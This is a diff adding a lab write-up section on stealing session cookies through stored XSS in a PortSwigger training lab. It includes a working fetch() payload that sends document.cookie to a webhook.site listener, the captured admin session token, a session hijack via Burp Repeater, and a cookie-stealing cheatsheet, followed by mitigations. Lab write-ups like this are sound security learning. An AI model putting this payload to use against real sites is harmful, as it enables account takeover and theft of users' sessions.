@@ -3,7 +3,7 @@
 
 > **Platform:** PortSwigger Web Security Academy  
 > **Difficulty:** Apprentice → Practitioner  
-> **Labs Completed:** 12 / 12  
+> **Labs Completed:** 13 / 13  
 > **Date:** March 2026
 
 ---
@@ -26,6 +26,7 @@
    - [DOM XSS — document.write inside select element](#10-dom-xss--documentwrite-inside-select-element)
    - [DOM XSS — AngularJS expression](#11-dom-xss--angularjs-expression)
    - [Reflected DOM XSS](#12-reflected-dom-xss)
+   - [Exploiting XSS to Steal Cookies](#13-exploiting-xss-to-steal-cookies)
 5. [Key Takeaways](#key-takeaways)
 
 ---
@@ -418,6 +419,104 @@ The server escaped `"` → `\"` but **did NOT escape `\`**.
 
 ---
 
+### 13. Exploiting XSS to Steal Cookies
+
+**Difficulty:** Practitioner  
+**Vulnerability:** Stored XSS in comment section — session cookie readable via `document.cookie`
+
+#### Background: What is Cookie Stealing?
+
+When a web application is vulnerable to Stored XSS and does not set the `HttpOnly` flag on session cookies, JavaScript can read them via `document.cookie`. The attacker exfiltrates this value to an external server and uses it to hijack the victim's session — without ever knowing their password.
+
+```
+Attacker injects payload → Victim visits page → JS executes in victim's browser
+        → document.cookie sent to attacker's server → Session Hijacking
+```
+
+| Scenario | Result |
+|----------|--------|
+| `HttpOnly` absent | `document.cookie` readable → Cookie theft possible |
+| `HttpOnly` present | `document.cookie` blocked → Cookie theft fails |
+
+> **Note:** Even with `HttpOnly`, XSS is still dangerous — it can be chained with CSRF to perform unauthorized actions without ever reading the cookie directly.
+
+---
+
+#### Step 1 — Set Up a Listener
+
+Used [webhook.site](https://webhook.site) as an external HTTP listener to receive the stolen cookie (used as a free alternative to Burp Collaborator, which requires Pro).
+
+Generated a unique endpoint:
+```
+https://webhook.site/e804775b-b215-44c9-bf39-57c672987a93
+```
+
+#### Step 2 — Craft the Payload
+
+```javascript
+<script>fetch("https://webhook.site/e804775b-b215-44c9-bf39-57c672987a93?c="+document.cookie)</script>
+```
+
+**How it works:**
+- `document.cookie` — reads all cookies accessible to JavaScript
+- `fetch(...)` — sends an HTTP GET request to the attacker's server
+- `?c=` — appends the cookie value as a query parameter
+
+#### Step 3 — Inject via Comment Section
+
+Submitted the payload in the **Comment** field of a blog post:
+
+```
+Name:    test
+Email:   test@test.com
+Website: http://test.com
+Comment: <script>fetch("https://webhook.site/e804775b-b215-44c9-bf39-57c672987a93?c="+document.cookie)</script>
+```
+
+#### Step 4 — Capture the Cookie
+
+When the admin user visited the blog post, their browser executed the injected script. The following request was captured on webhook.site:
+
+```
+GET /?c=session=4aTT2IQ2rs3Y8QDuLnoz98RGwVKKqoTh
+Host: webhook.site
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:148.0)
+Referer: https://[LAB-ID].web-security-academy.net/
+```
+
+**Captured cookie:**
+```
+session=4aTT2IQ2rs3Y8QDuLnoz98RGwVKKqoTh
+```
+
+#### Step 5 — Session Hijacking via Burp Repeater
+
+1. Opened Burp Suite → Proxy → visited `/my-account`
+2. Located the GET request in **HTTP History**
+3. Sent it to **Repeater**
+4. Replaced the session cookie with the stolen value:
+
+```http
+GET /my-account HTTP/2
+Host: [LAB-ID].web-security-academy.net
+Cookie: session=4aTT2IQ2rs3Y8QDuLnoz98RGwVKKqoTh
+```
+
+5. Sent the request → Response returned the **admin account page** ✅
+
+#### Mitigations
+
+| Defense | How it helps |
+|---------|-------------|
+| `HttpOnly` flag on cookies | Blocks `document.cookie` access from JavaScript |
+| Content Security Policy (CSP) | Restricts where scripts can send data |
+| Input validation & output encoding | Prevents XSS injection in the first place |
+| `SameSite=Strict` on cookies | Limits cross-site request abuse |
+
+> **Root cause:** The real fix is preventing XSS entirely through proper output encoding. `HttpOnly` is a defense-in-depth measure, not a substitute for fixing the injection vulnerability.
+
+---
+
 ## Key Takeaways
 
 ### The XSS Decision Tree
@@ -458,6 +557,14 @@ Where does my input land?
 | `'` blocked | Use `"` or HTML entities |
 | `< > "` all blocked | AngularJS expressions, JS string injection |
 | JSON string escaped | Try `\` to neutralize the escape |
+
+### Cookie Stealing Cheatsheet
+
+| Condition | Attack |
+|-----------|--------|
+| XSS + no `HttpOnly` | Steal cookie via `document.cookie` + `fetch()` |
+| XSS + `HttpOnly` present | Chain with CSRF — make browser send requests on victim's behalf |
+| No Burp Pro (no Collaborator) | Use webhook.site or python3 -m http.server as listener |
 
 ---
 
